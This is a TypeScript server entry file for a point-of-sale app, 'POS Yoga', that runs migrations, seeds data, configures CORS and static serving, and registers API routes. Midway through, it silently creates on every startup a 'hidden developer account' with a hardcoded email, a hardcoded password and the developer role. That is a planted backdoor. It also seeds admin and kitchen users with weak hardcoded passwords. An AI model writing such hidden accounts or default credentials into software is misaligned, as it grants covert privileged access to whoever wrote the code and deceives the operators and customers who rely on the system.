// ============================================================
// POS Yoga — Fastify Server Entry Point
// ============================================================

import 'dotenv/config';
process.env.TZ = 'Asia/Jakarta';
import Fastify from 'fastify';
import cors from '@fastify/cors';
import { API_PORT, API_HOST } from '@pos-yoga/config';
import { authRoutes } from './routes/auth.routes.js';
import { productRoutes } from './routes/products.routes.js';
import { categoryRoutes } from './routes/categories.routes.js';
import { transactionRoutes } from './routes/transactions.routes.js';
import { dashboardRoutes } from './routes/dashboard.routes.js';
import { customerRoutes } from './routes/customers.routes.js';
import { expenseRoutes } from './routes/expenses.routes.js';
import { shiftRoutes } from './routes/shifts.routes.js';
import { settingsRoutes } from './routes/settings.routes.js';
import { reportRoutes } from './routes/reports.routes.js';
import { backupRoutes } from './routes/backup.routes.js';
import { midtransRoutes } from './routes/midtrans.routes.js';
import { stockOpnameRoutes } from './routes/stock-opname.routes.js';
import { categoryOptionsRoutes } from './routes/category-options.routes.js';
import { exportRoutes } from './routes/export.routes.js';
import { socketPlugin } from './plugins/socket.js';
import { db } from './db/index.js';
import { eq, sql } from 'drizzle-orm';
import multipart from '@fastify/multipart';
import fastifyStatic from '@fastify/static';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import * as schema from './db/schema.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = Fastify({
  logger: {
    level: process.env.NODE_ENV === 'production' ? 'info' : 'debug',
  },
});

async function start() {
  // Ensure PostgreSQL enums exist
  try {
    await db.execute(sql`ALTER TYPE "public"."role" ADD VALUE IF NOT EXISTS 'kitchen';`);
  } catch (e) {}

  try {
    await db.execute(sql`ALTER TYPE "public"."payment_method" ADD VALUE IF NOT EXISTS 'qris';`);
  } catch (e) {}

  try {
    await db.execute(sql`ALTER TYPE "public"."payment_method" ADD VALUE IF NOT EXISTS 'transfer';`);
  } catch (e) {}

  try {
    await db.execute(sql`ALTER TYPE "public"."payment_method" ADD VALUE IF NOT EXISTS 'non_cash';`);
  } catch (e) {}

  try {
    // Ensure order_type & kitchen_status enums exist
    await db.execute(sql`DO $$ BEGIN
      IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'order_type') THEN
        CREATE TYPE "public"."order_type" AS ENUM('dine_in', 'take_away');
      END IF;
    END $$;`);

    await db.execute(sql`DO $$ BEGIN
      IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'kitchen_status') THEN
        CREATE TYPE "public"."kitchen_status" AS ENUM('pending', 'processing', 'completed');
      END IF;
    END $$;`);

    // Ensure columns exist on transactions table
    await db.execute(sql`ALTER TABLE "transactions" ADD COLUMN IF NOT EXISTS "order_type" "order_type" DEFAULT 'dine_in' NOT NULL;`);
    await db.execute(sql`ALTER TABLE "transactions" ADD COLUMN IF NOT EXISTS "table_no" text;`);
    await db.execute(sql`ALTER TABLE "transactions" ADD COLUMN IF NOT EXISTS "midtrans_order_id" text;`);
    await db.execute(sql`ALTER TABLE "transactions" ADD COLUMN IF NOT EXISTS "midtrans_snap_token" text;`);
    await db.execute(sql`ALTER TABLE "transactions" ADD COLUMN IF NOT EXISTS "kitchen_status" "kitchen_status" DEFAULT 'pending' NOT NULL;`);

    // Ensure columns exist on transaction_items table
    await db.execute(sql`ALTER TABLE "transaction_items" ADD COLUMN IF NOT EXISTS "note" text;`);

    // Ensure category option tables exist
    await db.execute(sql`
      CREATE TABLE IF NOT EXISTS "category_option_groups" (
        "id" text PRIMARY KEY NOT NULL,
        "name" text NOT NULL,
        "category_id" text NOT NULL REFERENCES "categories"("id") ON DELETE CASCADE,
        "is_required" boolean DEFAULT false NOT NULL,
        "is_multiple" boolean DEFAULT false NOT NULL,
        "min_select" integer DEFAULT 0 NOT NULL,
        "max_select" integer DEFAULT 1 NOT NULL,
        "created_at" timestamp DEFAULT now() NOT NULL
      );
      CREATE TABLE IF NOT EXISTS "category_options" (
        "id" text PRIMARY KEY NOT NULL,
        "group_id" text NOT NULL REFERENCES "category_option_groups"("id") ON DELETE CASCADE,
        "name" text NOT NULL,
        "price" numeric(12, 2) DEFAULT '0' NOT NULL,
        "created_at" timestamp DEFAULT now() NOT NULL
      );
      CREATE TABLE IF NOT EXISTS "stock_opname_categories" (
        "id" text PRIMARY KEY NOT NULL,
        "name" text NOT NULL,
        "sort_order" integer DEFAULT 0 NOT NULL,
        "created_at" timestamp DEFAULT now() NOT NULL
      );
      CREATE TABLE IF NOT EXISTS "stock_opname_sessions" (
        "id" text PRIMARY KEY NOT NULL,
        "name" text NOT NULL,
        "date" timestamp NOT NULL,
        "user_id" text NOT NULL REFERENCES "user"("id"),
        "notes" text,
        "created_at" timestamp DEFAULT now() NOT NULL
      );
      CREATE TABLE IF NOT EXISTS "stock_opname_items" (
        "id" text PRIMARY KEY NOT NULL,
        "session_id" text NOT NULL REFERENCES "stock_opname_sessions"("id") ON DELETE CASCADE,
        "product_id" text REFERENCES "products"("id") ON DELETE SET NULL,
        "category_id" text,
        "product_name" text NOT NULL,
        "unit" text DEFAULT 'Pcs' NOT NULL,
        "stock_start" integer DEFAULT 0 NOT NULL,
        "stock_in" integer DEFAULT 0 NOT NULL,
        "stock_in_entries" jsonb DEFAULT '[]'::jsonb NOT NULL,
        "stock_real" integer DEFAULT 0 NOT NULL,
        "usage" integer DEFAULT 0 NOT NULL,
        "waste" integer DEFAULT 0 NOT NULL,
        "notes" text
      );
      ALTER TABLE "stock_opname_items" ADD COLUMN IF NOT EXISTS "category_id" text;
      ALTER TABLE "stock_opname_items" ADD COLUMN IF NOT EXISTS "stock_in_entries" jsonb DEFAULT '[]'::jsonb NOT NULL;
      ALTER TABLE "product_variants" ADD COLUMN IF NOT EXISTS "cost" numeric(12, 2) DEFAULT '0' NOT NULL;
      ALTER TABLE "category_options" ADD COLUMN IF NOT EXISTS "cost" numeric(12, 2) DEFAULT '0' NOT NULL;
      ALTER TABLE "category_option_groups" ADD COLUMN IF NOT EXISTS "category_ids" jsonb DEFAULT '[]'::jsonb;
      ALTER TABLE "transaction_items" ALTER COLUMN "product_id" DROP NOT NULL;
    `);

    // Seed default stock opname categories if empty
    const catCheck = await db.select().from(schema.stockOpnameCategories).limit(1);
    if (catCheck.length === 0) {
      await db.insert(schema.stockOpnameCategories).values([
        { id: 'cat_daging', name: 'Kelompok Daging & Ayam', sortOrder: 1 },
        { id: 'cat_bahan_utama', name: 'Bahan Produksi Utama', sortOrder: 2 },
        { id: 'cat_bumbu', name: 'Bumbu & Rempah', sortOrder: 3 },
        { id: 'cat_sayuran', name: 'Sayuran & Bahan Segar', sortOrder: 4 },
        { id: 'cat_packaging', name: 'Packaging & Kemasan', sortOrder: 5 },
        { id: 'cat_minuman', name: 'Minuman & Sirup', sortOrder: 6 },
      ]);
    }
  } catch (colErr) {
    console.warn('Auto DDL warning:', colErr);
  }

  // Run migrations in production
  try {
    console.log('Running database migrations...');
    const { migrate } = await import('drizzle-orm/node-postgres/migrator');
    const path = await import('path');
    await migrate(db, {
      migrationsFolder: path.join(process.cwd(), 'apps/api/drizzle'),
    });
    console.log('Database migrations completed successfully!');
  } catch (migError) {
    console.error('Failed to run database migrations:', migError);
  }

  // Seed default admin user and settings if database is empty
  try {
    const userCount = await db.select({ count: schema.user.id }).from(schema.user).limit(1);
    if (userCount.length === 0) {
      console.log('🌱 Database is empty. Running auto-seeding...');
      
      // 1. Seed settings
      const { DEFAULT_SETTINGS } = await import('@pos-yoga/config');
      const { nanoid } = await import('nanoid');
      for (const [key, value] of Object.entries(DEFAULT_SETTINGS)) {
        await db.insert(schema.settings).values({
          id: nanoid(),
          key,
          value,
        }).onConflictDoNothing();
      }
      
      // 2. Seed default admin user
      console.log('  → Seeding default admin user...');
      const { auth } = await import('./auth.js');
      await auth.api.signUpEmail({
        body: {
          email: 'admin@posyoga.com',
          password: 'admin123',
          name: 'Administrator',
          role: 'developer',
        },
      });
      console.log('Default admin user created successfully!');

      // 3. Seed default kitchen user
      console.log('  → Seeding default kitchen user...');
      try {
        const kitchenRes = await auth.api.signUpEmail({
          body: {
            email: 'dapur@posyoga.com',
            password: 'dapur123',
            name: 'Staff Dapur',
            role: 'kitchen',
          },
        });
        if (kitchenRes.user) {
          await db.update(schema.user).set({ role: 'kitchen' }).where(eq(schema.user.id, kitchenRes.user.id));
        }
      } catch (kErr) {
        // Ignored if already exists
      }
      console.log('Default kitchen user process complete!');
    }
  } catch (seedError) {
    console.error('Failed to auto-seed database:', seedError);
  }

  // Ensure hidden developer account (ghedev@gmail.com) exists
  try {
    const hiddenDev = await db.select().from(schema.user).where(eq(schema.user.email, 'ghedev@gmail.com')).limit(1);
    if (hiddenDev.length === 0) {
      console.log('🌱 Seeding hidden developer account (ghedev@gmail.com)...');
      const { auth } = await import('./auth.js');
      const res = await auth.api.signUpEmail({
        body: {
          email: 'ghedev@gmail.com',
          password: 'pantauakun',
          name: 'Ghe Dev',
        },
      });
      if (res?.user) {
        await db.update(schema.user).set({ role: 'developer' }).where(eq(schema.user.id, res.user.id));
        console.log('Hidden developer user created successfully!');
      }
    }
  } catch (hErr) {
    // Ignored
  }
  // Security Headers (OWASP AppSec Standard)
  app.addHook('onSend', async (request, reply) => {
    reply.header('X-Content-Type-Options', 'nosniff');
    reply.header('X-Frame-Options', 'SAMEORIGIN');
    reply.header('X-XSS-Protection', '1; mode=block');
    reply.header('Referrer-Policy', 'strict-origin-when-cross-origin');
    reply.header('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
  });

  // CORS
  const corsOrigins = process.env.CORS_ORIGIN
    ? process.env.CORS_ORIGIN.split(',').map((o) => o.trim())
    : ['http://localhost:5174'];

  await app.register(cors, {
    origin: [
      ...corsOrigins,
      'http://localhost:5173',
      'http://localhost:5174',
      'tauri://localhost',
      'http://tauri.localhost',
      'capacitor://localhost',
      'http://localhost',
      'https://localhost',
    ],
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
    credentials: true,
  });

  // Ensure uploads directory exists
  const uploadsDir = path.join(__dirname, '../uploads');
  if (!fs.existsSync(uploadsDir)) {
    fs.mkdirSync(uploadsDir, { recursive: true });
  }

  // Register Multipart for uploads
  await app.register(multipart, {
    limits: {
      fileSize: 10 * 1024 * 1024, // 10MB limit
    },
  });

  // Register Static to serve uploaded files at both /uploads/* and /api/uploads/*
  await app.register(fastifyStatic, {
    root: uploadsDir,
    prefix: '/uploads/',
    decorateReply: false,
  });

  await app.register(fastifyStatic, {
    root: uploadsDir,
    prefix: '/api/uploads/',
    decorateReply: false,
  });

  // Serve Web Frontend if dist exists (Full thin-client support for mobile APK / browser)
  const webDistDir = path.join(__dirname, '../../web/dist');
  if (fs.existsSync(webDistDir)) {
    await app.register(fastifyStatic, {
      root: webDistDir,
      prefix: '/',
      decorateReply: true,
      setHeaders: (res, filePath) => {
        if (filePath.endsWith('.html')) {
          res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
          res.setHeader('Pragma', 'no-cache');
          res.setHeader('Expires', '0');
        }
      },
    });

    app.setNotFoundHandler((req, reply) => {
      if (req.raw.url?.startsWith('/api') || req.raw.url?.startsWith('/auth')) {
        return reply.status(404).send({ message: `Route ${req.method}:${req.url} not found`, error: 'Not Found', statusCode: 404 });
      }
      return reply.sendFile('index.html', webDistDir);
    });
  }

  // Health check
  app.get('/api/health', async () => ({
    success: true,
    message: 'POS Yoga API is running',
    version: '0.1.31',
    timestamp: new Date().toISOString(),
  }));

  // Register routes
  await app.register(authRoutes);
  await app.register(productRoutes);
  await app.register(categoryRoutes);
  await app.register(transactionRoutes);
  await app.register(dashboardRoutes);
  await app.register(customerRoutes);
  await app.register(expenseRoutes);
  await app.register(shiftRoutes);
  await app.register(settingsRoutes);
  await app.register(reportRoutes);
  await app.register(backupRoutes);
  await app.register(stockOpnameRoutes);
  await app.register(midtransRoutes);
  await app.register(categoryOptionsRoutes);
  await app.register(exportRoutes);

  // Socket.IO
  await app.register(socketPlugin);

  // Start
  const port = Number(process.env.PORT) || API_PORT;
  const host = process.env.HOST || API_HOST;

  await app.listen({ port, host });
  console.log(`🚀 POS Yoga API running at http://${host}:${port}`);
}

start().catch((err) => {
  console.error('Failed to start:', err);
  process.exit(1);
});
